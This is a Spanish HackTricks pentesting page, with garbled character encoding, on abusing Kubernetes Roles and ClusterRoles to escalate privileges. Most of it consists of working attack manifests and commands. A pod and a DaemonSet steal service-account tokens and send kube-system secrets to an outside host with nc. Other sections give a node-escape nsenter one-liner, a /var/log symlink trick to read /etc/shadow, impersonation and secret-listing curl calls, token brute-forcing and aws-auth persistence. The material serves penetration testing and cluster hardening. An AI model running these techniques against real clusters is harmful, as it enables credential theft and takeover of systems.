# Abusing Roles/ClusterRoles in Kubernetes

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop).
* Obt√©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com).
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family).
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.

</details>

Aqu√≠ puedes encontrar algunas configuraciones de Roles y ClusterRoles potencialmente peligrosas.\
Recuerda que puedes obtener todos los recursos admitidos con `kubectl api-resources`

## **Elevaci√≥n de privilegios**

Referido como el arte de obtener **acceso a un principal diferente** dentro del cl√∫ster **con diferentes privilegios** (dentro del cl√∫ster de Kubernetes o en nubes externas) a los que ya tienes, en Kubernetes existen b√°sicamente **4 t√©cnicas principales para escalar privilegios**:

* Ser capaz de **suplantar** a otros usuarios/grupos/SA con mejores privilegios dentro del cl√∫ster de Kubernetes o en nubes externas.
* Ser capaz de **crear/actualizar/ejecutar pods** donde puedes **encontrar o adjuntar SAs** con mejores privilegios dentro del cl√∫ster de Kubernetes o en nubes externas.
* Ser capaz de **leer secretos**, ya que los tokens de los SAs se almacenan como secretos.
* Ser capaz de **escapar al nodo** desde un contenedor, donde puedes robar todos los secretos de los contenedores que se ejecutan en el nodo, las credenciales del nodo y los permisos del nodo dentro de la nube en la que se est√° ejecutando (si corresponde).
* Una quinta t√©cnica que merece menci√≥n es la capacidad de **ejecutar port-forward** en un pod, ya que podr√≠as acceder a recursos interesantes dentro de ese pod.

### **Acceder a cualquier recurso o verbo (comod√≠n)**

Este privilegio proporciona acceso a **cualquier recurso con cualquier verbo**. Es el privilegio m√°s sustancial que un usuario puede obtener, especialmente si este privilegio tambi√©n es un "ClusterRole". Si es un "ClusterRole", el usuario puede acceder a los recursos de cualquier espacio de nombres y ser propietario del cl√∫ster con ese permiso.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```

### **Acceso a cualquier recurso**

Darle a un usuario permiso para **acceder a cualquier recurso puede ser muy arriesgado**. Pero, ¬ø**qu√© verbos** permiten el acceso a estos recursos? Aqu√≠ hay algunos permisos RBAC peligrosos que pueden da√±ar todo el cl√∫ster:

* **resources: \["\*"] verbs: \["create"]** - Este privilegio puede **crear cualquier recurso** en el cl√∫ster, como **pods**, roles, etc. Un atacante podr√≠a abusar de esto para **elevar privilegios**. Un ejemplo de esto se puede encontrar en la secci√≥n de **"Creaci√≥n de Pods"**.
* **resources: \["\*"] verbs: \["list"]** - La capacidad de listar cualquier recurso se puede utilizar para **filtrar secretos de otros usuarios** y podr√≠a facilitar la **elevaci√≥n de privilegios**. Un ejemplo de esto se encuentra en la secci√≥n de **"Listado de secretos"**.
* **resources: \["\*"] verbs: \["get"]** - Este privilegio se puede utilizar para **obtener secretos de otras cuentas de servicio**.

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```

### Creaci√≥n de Pod - Robo de Token

Un atacante con permisos para crear un pod en el espacio de nombres "kube-system" puede crear contenedores de criptominer√≠a, por ejemplo. Adem√°s, si hay una **cuenta de servicio con permisos privilegiados, al ejecutar un pod con ese servicio se pueden abusar de los permisos para escalar privilegios**.

Aqu√≠ tenemos una cuenta privilegiada predeterminada llamada _bootstrap-signer_ con permisos para listar todos los secretos.

![](https://www.cyberark.com/wp-content/uploads/2018/12/rolebinding\_with\_cluster\_admin\_clusterrole-1024x545.png)

El atacante puede crear un pod malicioso que utilizar√° el servicio privilegiado. Luego, abusando del token del servicio, se exfiltrar√°n los secretos:

![](https://www.cyberark.com/wp-content/uploads/2018/12/pods\_yaml\_with\_autoamountServiceAccountToken-1024x345.png)

```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```

En la imagen anterior, observe c√≥mo se utiliza el servicio _bootstrap-signer_ en `serviceAccountname`.

Simplemente crea el pod malicioso y espera los secretos en el puerto 6666:

### **Creaci√≥n y escape del Pod**

La siguiente definici√≥n otorga todos los privilegios que un contenedor puede tener:

* **Acceso privilegiado** (desactivando protecciones y estableciendo capacidades)
* **Desactivar los espacios de nombres hostIPC y hostPid** que pueden ayudar a escalar privilegios
* **Desactivar el espacio de nombres hostNetwork**, lo que permite robar privilegios de la nube de los nodos y obtener un mejor acceso a las redes
* **Montar el directorio / del host dentro del contenedor**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Crear el pod con:

```bash
kubectl --token $token create -f mount_root.yaml
```

Una l√≠nea de [este tweet](https://twitter.com/mauilion/status/1129468485480751104) y con algunas adiciones:

```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```

Ahora que puedes escapar al nodo, verifica las t√©cnicas de post-explotaci√≥n en:

#### Sigilo

Probablemente quieras ser **m√°s sigiloso**, en las siguientes p√°ginas puedes ver a qu√© podr√≠as acceder si creas un pod habilitando solo algunos de los privilegios mencionados en la plantilla anterior:

* **Privilegios + hostPID**
* **Solo privilegios**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_Puedes encontrar ejemplos de c√≥mo crear/abusar de las configuraciones de pods privilegiados anteriores en_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Crear Pod - Mover a la nube

Si puedes **crear** un **pod** (y opcionalmente una **cuenta de servicio**), es posible que puedas **obtener privilegios en el entorno de la nube** asignando roles de la nube a un pod o una cuenta de servicio y luego accediendo a ellos.\
Adem√°s, si puedes crear un **pod con el espacio de nombres de red del host**, puedes **robar el rol IAM** de la instancia del **nodo**.

Para obtener m√°s informaci√≥n, consulta:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Crear/Parchear Despliegues, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Trabajos y Cronjobs**

Los despliegues, daemonsets, statefulsets, replicationcontrollers, replicasets, trabajos y cronjobs son todos privilegios que permiten la creaci√≥n de diferentes tareas en el cl√∫ster. Adem√°s, es posible usar todos ellos para **desarrollar pods e incluso crear pods**. Por lo tanto, es posible **abusar de ellos para escalar privilegios al igual que en el ejemplo anterior**.

Supongamos que tenemos **permiso para crear un daemonset** y creamos el siguiente archivo YAML. Este archivo YAML est√° configurado para realizar los mismos pasos que mencionamos en la secci√≥n "crear pods".

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```

En la l√≠nea 6 puedes encontrar el objeto "spec" y objetos hijos como "**template**" en la l√≠nea 10. Estos objetos contienen la configuraci√≥n para la tarea que deseamos realizar. Otra cosa a tener en cuenta es el "**serviceAccountName**" en la l√≠nea 15 y el objeto "**containers**" en la l√≠nea 18. Esta es la parte que se relaciona con la creaci√≥n de nuestro contenedor malicioso.

La documentaci√≥n de la API de Kubernetes indica que el punto final "PodTemplateSpec" tiene la opci√≥n de crear contenedores. Y, como puedes ver: **deployment, daemonsets, statefulsets, replicationcontrollers, replicasets, jobs y cronjobs todos pueden ser utilizados para crear pods**:

![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-8.png)

**Por lo tanto, el privilegio de crear o actualizar tareas tambi√©n puede ser abusado para la escalada de privilegios en el cl√∫ster.**

### **Ejecuci√≥n de Pods**

**`pods/exec`** es un recurso en Kubernetes utilizado para **ejecutar comandos en una shell dentro de un pod**. Este privilegio est√° destinado a administradores que desean **acceder a los contenedores y ejecutar comandos**. Es como crear una sesi√≥n SSH para el contenedor.

Si tenemos este privilegio, en realidad obtenemos la capacidad **de tomar el control de todos los pods**. Para hacer eso, debemos usar el siguiente comando:

```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```

Ten en cuenta que, al poder acceder a cualquier pod, puedes abusar del token de otros pods de la misma manera que en la **explotaci√≥n de la creaci√≥n de pods** para intentar escalar privilegios.

### port-forward

Este permiso permite **redirigir un puerto local a un puerto espec√≠fico dentro del pod**. Esto est√° dise√±ado para facilitar la depuraci√≥n de aplicaciones que se ejecutan dentro de un pod, pero un atacante podr√≠a abusar de esto para obtener acceso a aplicaciones interesantes (como bases de datos) o vulnerables (¬øsitios web?) dentro de un pod:

```
kubectl port-forward pod/mypod 5000:5000
```

### **Escape de /var/log/ en hosts con permisos de escritura**

Como se indica en esta investigaci√≥n, si puedes acceder o crear un pod con el directorio `/var/log/` de los hosts montado en √©l, puedes escapar del contenedor. Esto se debe a que cuando el Kube-API intenta obtener los registros de un contenedor (usando `kubectl logs <pod>`), solicita el archivo `0.log` del pod utilizando el punto final `/logs/` del servicio Kubelet. El servicio Kubelet expone el punto final `/logs/`, que b√°sicamente expone el sistema de archivos `/var/log` del contenedor.

Por lo tanto, un atacante con acceso para escribir en la carpeta `/var/log/` del contenedor podr√≠a abusar de este comportamiento de 2 formas:

* Modificando el archivo `0.log` de su contenedor (generalmente ubicado en `/var/logs/pods/namespace_pod_uid/container/0.log`) para que sea un enlace simb√≥lico que apunte a `/etc/shadow`, por ejemplo. Luego, podr√°s extraer el archivo shadow de los hosts haciendo:

```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```

* Si el atacante controla cualquier principal con los **permisos para leer `nodes/log`**, simplemente puede crear un **enlace simb√≥lico** en `/host-mounted/var/log/sym` a `/` y cuando **acceda a `https://<gateway>:10250/logs/sym/` se mostrar√° el sistema de archivos ra√≠z de los hosts** (cambiando el enlace simb√≥lico se puede obtener acceso a archivos).

```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```

**Se puede encontrar un laboratorio y un exploit automatizado en** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Bypassing readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Si tienes la suerte de contar con la capacidad altamente privilegiada `CAP_SYS_ADMIN`, simplemente puedes volver a montar la carpeta como rw:

```bash
mount -o rw,remount /hostlogs/
```

#### Bypassing hostPath readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Como se indica en [**esta investigaci√≥n**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), es posible eludir la protecci√≥n:

```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```

Lo que se pretend√≠a era evitar escapes como los anteriores, en lugar de utilizar un montaje de hostPath, se utiliza un PersistentVolume y un PersistentVolumeClaim para montar una carpeta de hosts en el contenedor con acceso de escritura:

```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```

### **Suplantaci√≥n de cuentas privilegiadas**

Con el privilegio de [**suplantaci√≥n de usuario**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), un atacante podr√≠a suplantar una cuenta privilegiada.

En este ejemplo, la cuenta de servicio _**sa-imper**_ tiene un enlace a un ClusterRole con reglas que le permiten suplantar grupos y usuarios.

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_for\_user\_impersonation\_2.png)

Es posible **listar todos los secretos** con los atributos `--as=null --as-group=system:master`:

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_with\_and\_without\_user\_impersonation-1024x108.png)

**Tambi√©n es posible realizar la misma acci√≥n a trav√©s del punto final de la API REST:**

```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

### **Listado de Secretos**

El **privilegio de listar secretos** es una capacidad importante de tener en el cl√∫ster. Un usuario con el permiso para listar secretos puede **potencialmente ver todos los secretos en el cl√∫ster, incluyendo las claves de administrador**. La clave secreta es un token JWT codificado en base64.

![](https://www.cyberark.com/wp-content/uploads/2018/12/listing\_secrets\_role.png)

Un atacante que obtiene **acceso a \_list secrets\_** en el cl√∫ster puede utilizar los siguientes comandos _curl_ para obtener todos los secretos en el espacio de nombres "kube-system":

```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```

![](https://www.cyberark.com/wp-content/uploads/2019/08/Kube-Pentest-Fig-2.png)

### **Leyendo un secreto: fuerza bruta de IDs de tokens**

Un atacante que encuentra un token con permiso para leer un secreto no puede utilizar este permiso sin conocer el nombre completo del secreto. Este permiso es diferente al permiso de _**listar**_ _**secretos**_ descrito anteriormente.

![](https://www.cyberark.com/wp-content/uploads/2018/12/getting\_secret\_clusterRole.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRoleBinding\_with\_get\_secrets\_clusterRole.png)

Aunque el atacante no conoce el nombre del secreto, hay cuentas de servicio predeterminadas que se pueden enlistar.

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_accounts\_list.png)

Cada cuenta de servicio tiene un secreto asociado con un prefijo est√°tico (que no cambia) y un sufijo de una cadena de cinco caracteres al azar.

![](https://www.cyberark.com/wp-content/uploads/2018/12/default\_service\_account\_on\_kube\_system\_namespace-1024x556.png)

La estructura del token al azar es una cadena de cinco caracteres construida a partir de caracteres alfanum√©ricos (letras min√∫sculas y d√≠gitos). **Pero no contiene todas las letras y d√≠gitos.**

Al examinar el [c√≥digo fuente](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83), parece que el token se genera solo a partir de 27 caracteres "bcdfghjklmnpqrstvwxz2456789" y no 36 (a-z y 0-9).

![](https://www.cyberark.com/wp-content/uploads/2018/12/character\_set\_from\_rand\_go.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/comments\_on\_removing\_characters\_rand\_go\_character\_set-1024x138.png)

Esto significa que hay 275 = 14,348,907 posibilidades para un token.

Un atacante puede realizar un ataque de fuerza bruta para adivinar el ID del token en un par de horas. Si tiene √©xito al obtener secretos de cuentas de servicio predeterminadas sensibles, podr√° escalar privilegios.

### Solicitudes de firma de certificados

Si tienes los verbos **`create`** en el recurso `certificatesigningrequests` (o al menos en `certificatesigningrequests/nodeClient`), puedes **crear** una nueva solicitud de firma de certificado para un **nuevo nodo**.

Seg√∫n la [documentaci√≥n, es posible aprobar autom√°ticamente estas solicitudes](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), por lo que en ese caso **no necesitas permisos adicionales**. De lo contrario, necesitar√≠as poder aprobar la solicitud, lo que significa actualizar en `certificatesigningrequests/approval` y `approve` en `signers` con el nombre de recurso `<signerNameDomain>/<signerNamePath>` o `<signerNameDomain>/*`.

Un **ejemplo de un rol** con todos los permisos requeridos es:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```

Entonces, con el nuevo CSR del nodo aprobado, puedes **abusar** de los permisos especiales de los nodos para **robar secretos** y **elevar privilegios**.

En [**este post**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) y [**este otro**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) se configura la configuraci√≥n de inicio de sesi√≥n autom√°tico de GKE K8s TLS y se abusa de ella para generar credenciales de un nuevo nodo de K8s y luego abusar de ellas para elevar privilegios al robar secretos.\
Si **tienes los privilegios mencionados, puedes hacer lo mismo**. Ten en cuenta que el primer ejemplo evita el error que impide que un nuevo nodo acceda a los secretos dentro de los contenedores porque un **nodo solo puede acceder a los secretos de los contenedores montados en √©l**.

La forma de evitar esto es simplemente **crear credenciales de nodo para el nombre del nodo donde se monta el contenedor con los secretos interesantes** (pero solo revisa c√≥mo hacerlo en el primer post):

```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```

### AWS EKS aws-auth configmaps

Los principales que pueden modificar **`configmaps`** en el espacio de nombres kube-system en cl√∫steres EKS (necesitan estar en AWS) pueden obtener privilegios de administrador del cl√∫ster sobrescribiendo el configmap **aws-auth**.\
Los verbos necesarios son **`update`** y **`patch`**, o **`create`** si el configmap no ha sido creado:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
Puedes usar **`aws-auth`** para **persistencia** dando acceso a usuarios de **otras cuentas**.

Sin embargo, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **no funciona desde una cuenta diferente**. Pero en realidad `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` funciona si colocas el ARN del cl√∫ster en lugar de solo el nombre.\
Para que `kubectl` funcione, aseg√∫rate de **configurar** el **kubeconfig de la v√≠ctima** y en los argumentos de ejecuci√≥n de aws agrega `--profile other_account_role` para que kubectl use el perfil de la otra cuenta para obtener el token y contactar a AWS.
{% endhint %}

### Escalando en GKE

Hay **2 formas de asignar permisos de K8s a los principales de GCP**. En cualquier caso, el principal tambi√©n necesita el permiso **`container.clusters.get`** para poder obtener credenciales para acceder al cl√∫ster, o deber√°s **generar tu propio archivo de configuraci√≥n de kubectl** (sigue el siguiente enlace).

{% hint style="warning" %}
Cuando se habla con el punto de conexi√≥n de la API de K8s, se enviar√° el **token de autenticaci√≥n de GCP**. Luego, GCP, a trav√©s del punto de conexi√≥n de la API de K8s, primero **verificar√° si el principal** (por correo electr√≥nico) **tiene alg√∫n acceso dentro del cl√∫ster**, luego verificar√° si tiene **alg√∫n acceso a trav√©s de GCP IAM**.\
Si **cualquiera** de ellos es **verdadero**, se le **responder√°**. Si **no**, se dar√° un **error** sugiriendo dar **permisos a trav√©s de GCP IAM**.
{% endhint %}

Entonces, el primer m√©todo es usar **GCP IAM**, los permisos de K8s tienen sus **equivalentes permisos de GCP IAM**, y si el principal los tiene, podr√° usarlos.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

El segundo m√©todo es **asignar permisos de K8s dentro del cl√∫ster** identificando al usuario por su **correo electr√≥nico** (incluidas las cuentas de servicio de GCP).

### Crear token de serviceaccounts

Los principales que pueden **crear TokenRequests** (`serviceaccounts/token`) pueden emitir tokens para SA con privilegios de administrador (informaci√≥n de [**aqu√≠**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Los principales que pueden **`actualizar`** o **`parchar`** **`pods/ephemeralcontainers`** pueden obtener **ejecuci√≥n de c√≥digo en otros pods**, y potencialmente **escapar** a su nodo agregando un contenedor ef√≠mero con un securityContext privilegiado.

### ValidatingWebhookConfigurations o MutatingWebhookConfigurations

Los principales con cualquiera de los verbos `create`, `update` o `patch` sobre `validatingwebhookconfigurations` o `mutatingwebhookconfigurations` podr√≠an ser capaces de **crear una de esas webhookconfigurations** para poder **escalar privilegios**.

Para un ejemplo de [`mutatingwebhookconfigurations, consulta esta secci√≥n de esta publicaci√≥n`](./#malicious-admission-controller).

### Escalar

Como se puede leer en la siguiente secci√≥n: [**Prevenci√≥n de escalada de privilegios incorporada**](./#built-in-privileged-escalation-prevention), un principal no puede actualizar ni crear roles o clusterroles sin tener esos nuevos permisos. Excepto si tiene el **verbo `escalate`** sobre **`roles`** o **`clusterroles`.**\
Entonces puede actualizar/crear nuevos roles, clusterroles con mejores permisos que los que tiene.

### Nodes proxy

Los principales con acceso a la subruta **`nodes/proxy`** pueden **ejecutar c√≥digo en pods** a trav√©s de la API de Kubelet (seg√∫n [**esto**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). M√°s informaci√≥n sobre la autenticaci√≥n de Kubelet en esta p√°gina:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Tienes un ejemplo de c√≥mo obtener [**RCE hablando autorizado a una API de Kubelet aqu√≠**](../pentesting-kubernetes-services/#kubelet-rce).

### Eliminar pods + nodos no programables

Los principales que pueden **eliminar pods** (verbo `delete` sobre el recurso `pods`), o **expulsar pods** (verbo `create` sobre el recurso `pods/eviction`), o **cambiar el estado del pod** (acceso a `pods/status`) y pueden **hacer que otros nodos no sean programables** (acceso a `nodes/status`) o **eliminar nodos** (verbo `delete` sobre el recurso `nodes`) y tienen control sobre un pod, podr√≠an **robar pods de otros nodos** para que se ejecuten en el nodo comprometido y el atacante pueda **robar los tokens** de esos pods.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Estado de los servicios (CVE-2020-8554)

Los principales que pueden **modificar** **`services/status`** pueden establecer el campo `status.loadBalancer.ingress.ip` para explotar la **vulnerabilidad no corregida CVE-2020-8554** y lanzar ataques **MiTM contra el cl√∫**ster. La mayor√≠a de las mitigaciones para CVE-2020-8554 solo previenen los servicios ExternalIP (seg√∫n [**esto**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Estado de los nodos y pods

Los principales con permisos de **`update`** o **`patch`** sobre `nodes/status` o `pods/status`, pueden modificar las etiquetas para afectar las restricciones de programaci√≥n impuestas.

## Prevenci√≥n de escalada de privilegios incorporada

Aunque puede haber permisos riesgosos, Kubernetes est√° haciendo un buen trabajo al prevenir otros tipos de permisos con potencial de escalada de privilegios.

Kubernetes tiene un [mecanismo incorporado](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) para eso:

> La API de RBAC **evita que los usuarios escalen privilegios** editando roles o vinculaciones de roles. Debido a que esto se aplica a nivel de API, se aplica incluso cuando el autorizador RBAC no est√° en uso.
>
> Un usuario solo puede **crear/actualizar un rol si ya tiene todos los permisos contenidos en el rol**, en el mismo √°mbito que el rol (a nivel de cl√∫ster para un ClusterRole, dentro del mismo espacio de nombres o a nivel de cl√∫ster para un Role)

{% hint style="warning" %}
Hay una excepci√≥n a la regla anterior. Si un principal tiene el **verbo `escalate`** sobre **`roles`** o **`clusterroles`**, puede aumentar los privilegios de roles y clusterroles incluso sin tener los permisos √©l mismo.
{% endhint %}

Veamos un ejemplo de esta prevenci√≥n.

Una cuenta de servicio llamada _sa7_ est√° en un RoleBinding _edit-role-rolebinding_. Este objeto RoleBinding tiene un rol llamado _edit-role_ que tiene **reglas de permisos completas** sobre roles. Te√≥ricamente, esto significa que la cuenta de servicio puede **editar cualquier rol** en el espacio de nombres _default_.

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_roles\_roleBinding\_binding\_sa7\_to\_edit\_role.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/role\_to\_edit\_any\_role.png)

Tambi√©n hay un rol existente llamado _list-pods_. Cualquier persona con este rol puede listar todos los pods en el espacio de nombres _default_. El usuario _sa7_ deber√≠a tener permisos para editar cualquier rol, as√≠ que veamos qu√© sucede cuando intenta agregar el recurso "secrets" a los recursos del rol.

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_role\_resources-300x66.png)

Despu√©s de intentarlo, recibiremos un error "forbidden: attempt to grant extra privileges" (Figura 31), porque aunque nuestro usuario _sa7_ tiene permisos para actualizar roles para cualquier recurso, solo puede actualizar el rol para los recursos en los que tiene permisos.

![](https://www.cyberark.com/wp-content/uploads/2018/12/forbidden\_attempt\_to\_gran\_extra\_privileges\_message-1024x288.png)

### **Obtener y modificar RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Aparentemente esta t√©cnica funcionaba antes, pero seg√∫n mis pruebas ya no funciona por la misma raz√≥n explicada en la secci√≥n anterior. No puedes crear/modificar un rolebinding para darte a ti mismo o a otro SA algunos privilegios si no los tienes ya.**
{% endhint %}

